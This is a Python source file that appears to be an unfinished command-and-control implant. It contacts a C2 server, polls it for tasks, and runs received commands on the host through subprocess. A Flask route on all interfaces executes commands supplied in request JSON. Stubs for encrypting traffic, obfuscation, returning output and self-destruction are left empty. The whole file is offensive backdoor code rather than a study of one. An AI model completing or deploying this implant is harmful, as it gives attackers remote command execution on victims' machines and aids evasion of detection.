from flask import Flask, request, render_template
import requests
import json 
import subprocess
import time

#remember, the entire idea is that polling for tasks is done as a post, and you need to send a dummy get to poll 

app = Flask(__name__)
url = "http://localhost:80/"
routes = {
    0 : url + "task", 
    1: url + "upload"
}

#Encryption of data 
def encrypt(plain_str): 
    pass

#Decryption of data 
def decrypt(plain_str): 
    pass 

#Execute command 
def exec(cmd): 
    print("[+] Executing command: %s" % cmd)
    cmd_lst = cmd.split()
    output = subprocess.run(cmd_lst, capture_output=True, text=True) #running command on host machine 
    result = output.stdout 
    print("[+] Result: %s" % cmd)
    return result 

#Sending output back to C2Server 
def send_output(result): 
    pass

#Called to clean up and destroy implant
def destroy(): 
    pass

#Setting up initial connection with C2 Server
def init(): 
    tries = 0
    while tries < 3: 
        print("[+] Contacting Server...")
        try:
            response = requests.get(url)
            print("[+] Connection Established...")
            print(response.text)
            return
        except Exception as e: 
            print("[-] Error in Contacting Server...")
            tries += 1
    print("[-] Failure in establishing connection.")
    destroy()
    exit(1) #If reached, server cannot be contacted, and must exit

#Gets task from GET request and executes 
@app.route('/', methods=['GET'])
def task():
    cmd = request.get_json() 
    #any decryption, de-obfuscation and string processing should go here 
    result = exec(cmd)
    #Encryption and obfuscation of data goes here 
    send_output(result)
    return render_template('tasks.html')

if __name__ == '__main__':
    init()
    while True: 
        query = "some code"
        try: 
            response = requests.post(routes[1], data=query)
            #logic for extracting cmd goes here 
            cmd = "ls -la"
            exec(cmd)
        except Exception as e: 
            """
            Options for handling query failure: 
                - self destruct immediately 
                - try 3 times, the exit if all fail
                - sleep and try again, etc.
            """
    app.run(host='0.0.0.0', port=8080)
    


    